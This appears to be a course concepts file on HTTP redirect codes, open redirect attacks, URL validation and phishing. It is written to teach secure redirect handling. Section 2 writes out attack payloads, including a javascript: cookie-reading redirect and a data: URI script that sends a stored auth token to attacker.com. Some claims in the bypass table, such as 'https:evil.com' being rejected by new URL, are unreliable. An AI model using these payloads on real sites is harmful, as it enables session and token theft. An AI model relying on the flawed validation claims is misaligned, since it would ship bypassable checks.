# 03-CONCEPTS.md — Simple Redirector (M16)

## 1. HTTP Redirect Status Codes (Deep Dive)

### WHAT

HTTP redirect status codes tell the client (browser, API consumer) that the requested resource is available at a different URL. The client must repeat the request at the new location.

### HOW: The Four Codes

```
Client                                    Server
  │                                          │
  │  POST /redirect { "url": "https://x.com" }│
  │─────────────────────────────────────────►│
  │                                          │
  │  HTTP/1.1 302 Found                      │
  │  Location: https://x.com                 │
  │◄─────────────────────────────────────────│
  │                                          │
  │  GET https://x.com                       │
  │─────────────────────────────────────────►│ (browser follows)
```

**301 Moved Permanently:**
- **Semantics**: The resource has moved forever. All future requests should use the new URL.
- **Method behavior**: Historically, browsers changed POST to GET on redirect (RFC 2616). RFC 7231 clarified that 301 does not guarantee method preservation, and browsers still change POST to GET for compatibility.
- **Caching**: Aggressively cached by browsers. A `301` to `evil.com` is cached indefinitely.
- **Use case**: Permanent URL restructuring (e.g., `/old-blog` → `/new-blog`).

**302 Found (formerly "Moved Temporarily"):**
- **Semantics**: The resource is temporarily at a different URL.
- **Method behavior**: Browsers may change POST to GET (same ambiguity as 301).
- **Caching**: Not cached by default.
- **Use case**: Dynamic redirects, A/B testing, temporary maintenance pages.

**307 Temporary Redirect:**
- **Semantics**: Same as 302, but **method must not change**. A POST redirects to another POST.
- **Method behavior**: Strictly preserved. The client must not automatically convert POST to GET.
- **Caching**: Not cached by default.
- **Use case**: Payment flows, form submissions that redirect to a processing endpoint.

**308 Permanent Redirect:**
- **Semantics**: Same as 301, but **method must not change**.
- **Method behavior**: Strictly preserved. POST stays POST.
- **Caching**: Permanently cached.
- **Use case**: Permanent HTTP → HTTPS upgrade for POST endpoints, API version migrations.

### Comparison Table

| Code | Permanent? | Preserves Method? | Cached? | Safe for Dynamic? |
|------|-----------|-------------------|---------|-------------------|
| 301 | Yes | No (historically) | Yes | No |
| 302 | No | No (historically) | No | Yes |
| 307 | No | Yes | No | Yes |
| 308 | Yes | Yes | Yes | No |

### WHY IT MATTERS

Using the wrong code has real consequences:
- **301 for dynamic redirects**: Attackers cache malicious destinations. Users are permanently redirected even after the bug is fixed.
- **302 for permanent moves**: SEO suffers. Search engines keep indexing the old URL.
- **307/308 confusion**: API clients that expect method preservation break if you use 302 instead of 307.

---

## 2. Open Redirect Attacks (Deep Dive)

### WHAT

An open redirect occurs when an application accepts arbitrary user input as a redirect destination without validation. The attacker abuses the trust of the originating domain.

### HOW: Attack Vectors

**Vector 1: Phishing**

```
Legitimate-looking URL:
https://trusted-bank.com/redirect?url=https://evil-phishing-site.com/login

User sees:   trusted-bank.com
User lands:  evil-phishing-site.com
User thinks: "This is my bank's login page."
User does:   Enters credentials.
Result:      Credentials stolen.
```

**Vector 2: XSS via `javascript:` protocol**

```javascript
// Payload:
javascript:alert(document.cookie)

// In the browser:
// 1. User clicks a link to https://trusted-site.com/redirect?url=javascript:alert(document.cookie)
// 2. Browser navigates to the redirect endpoint.
// 3. Server returns 302 Location: javascript:alert(document.cookie)
// 4. Browser executes the JavaScript in the context of trusted-site.com.
// 5. Attacker reads cookies, localStorage, and makes authenticated requests.
```

**Vector 3: Data Exfiltration via `data:` URI**

```javascript
// Payload:
data:text/html,<script>
  fetch('https://attacker.com/steal?token='+localStorage.getItem('authToken'))
</script>

// Result: Attacker receives the user's auth token when the "redirect" loads.
```

**Vector 4: OAuth Authorization Code Theft**

```
OAuth Flow:
1. User visits evil-site.com
2. evil-site.com redirects user to:
   https://trusted-provider.com/oauth/authorize?client_id=...&redirect_uri=https://trusted-app.com/callback
3. User logs in and approves.
4. trusted-provider.com redirects to the callback with an authorization code.
5. BUT if trusted-provider.com does not validate redirect_uri,
   evil-site.com could have sent:
   redirect_uri=https://evil-site.com/steal
6. Authorization code is sent to attacker.
```

### WHY IT MATTERS

Open redirects are often classified as "medium" severity, but they are **phishing multipliers**. A phishing email with a raw evil domain is suspicious. A phishing email with a trusted domain redirect bypasses both user skepticism and email security filters.

Real-world breaches:
- **Facebook (2014)**: Multiple open redirect vulnerabilities in `facebook.com/l.php?u=` were used to redirect users to phishing pages.
- **Google (2016)**: Open redirects in Google accounts were abused to steal OAuth tokens.
- **Major banks**: Continuously battle open redirects in their login flows because marketing teams demand "redirect after login" features.

---

## 3. URL Validation Deep Dive

### WHAT

URL validation ensures that a user-supplied string is a safe, well-formed HTTP(S) URL before redirecting to it.

### HOW: The `URL` Constructor

```javascript
const parsed = new URL('https://user:pass@example.com:8080/path?query=1#frag');

parsed.protocol  // "https:"
parsed.hostname  // "example.com"
parsed.port      // "8080"
parsed.pathname  // "/path"
parsed.search    // "?query=1"
parsed.hash      // "#frag"
parsed.href      // full URL
```

**Critical property:** `new URL()` throws on malformed input. This is a free validation step.

**Validation checklist:**
1. Parse with `new URL(url)` — catch malformed URLs.
2. Check `protocol` is `http:` or `https:`.
3. Check `hostname` is non-empty.
4. (Optional) Check `hostname` is not an IP address in a private range.
5. (Production) Convert IDN to Punycode and check against domain whitelist.

### Common Bypasses

| Bypass Attempt | Why It Fails with `new URL()` + Whitelist |
|----------------|--------------------------------------------|
| `javascript:alert(1)` | `protocol === "javascript:"` → rejected |
| `javascript://example.com/%0Aalert(1)` | `protocol === "javascript:"` → rejected |
| `data:text/html,<script>…` | `protocol === "data:"` → rejected |
| `https://` (empty host) | `hostname === ""` → rejected |
| `//evil.com` (protocol-relative) | `new URL("//evil.com")` requires a base URL; standalone parse throws |
| `https:evil.com` (no slashes) | `new URL("https:evil.com")` → host is empty or malformed → rejected |

### WHY IT MATTERS

URL parsing is a security boundary. Every bypass technique above has been used in real exploits. The `URL` constructor handles encoding, edge cases, and malformed input. Custom regexes do not.

---

## 4. Phishing Vectors

### WHAT

Phishing is the fraudulent attempt to obtain sensitive information by disguising as a trustworthy entity. Open redirects are a key enabler.

### HOW: The Trust Chain

```
Without open redirect:
┌─────────────┐      ┌─────────────┐      ┌─────────────┐
│   Email     │─────►│  evil.com   │─────►│ Fake login  │
│  "Click here"│     │  (suspicious)│     │   page      │
└─────────────┘      └─────────────┘      └─────────────┘
         User sees: evil.com → distrusts

With open redirect:
┌─────────────┐      ┌─────────────────────┐      ┌─────────────┐
│   Email     │─────►│ trusted-bank.com/   │─────►│ Fake login  │
│  "Click here"│     │ redirect?url=evil   │     │   page      │
└─────────────┘      └─────────────────────┘      └─────────────┘
         User sees: trusted-bank.com → trusts
```

**Advanced techniques:**
- **Homograph attacks**: `https://раураl.com` (Cyrillic) looks like `https://paypal.com`.
- **Typosquatting**: `https://paypa1.com` instead of `https://paypal.com`.
- **URL shorteners**: `https://bit.ly/abc123` hides the true destination.
- **Open redirect chaining**: `trusted.com → redirector.com → evil.com`.

### WHY IT MATTERS

Phishing causes 90%+ of data breaches (Verizon DBIR, 2024). Open redirects lower the barrier to creating convincing phishing links. A redirector without validation is a free phishing infrastructure for attackers.

## WRONG vs RIGHT

| WRONG | RIGHT |
|-------|-------|
| `res.redirect(url)` with no checks | `new URL(url)` + protocol whitelist + hostname check |
| Accept any protocol | Only `http:` and `https:` |
| Use `301` for user-supplied URLs | Use `302` (temporary) for dynamic redirects |
| Trust string prefix checks | Use structured parsing |
| Ignore IDN/homograph risks | Convert to Punycode and check domain whitelist in production |

## SOURCES

- [RFC 7231 — HTTP/1.1 Semantics and Content](https://datatracker.ietf.org/doc/html/rfc7231)
- [RFC 7538 — HTTP Status Code 308](https://datatracker.ietf.org/doc/html/rfc7538)
- [OWASP Unvalidated Redirects Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- Verizon DBIR, 2024.
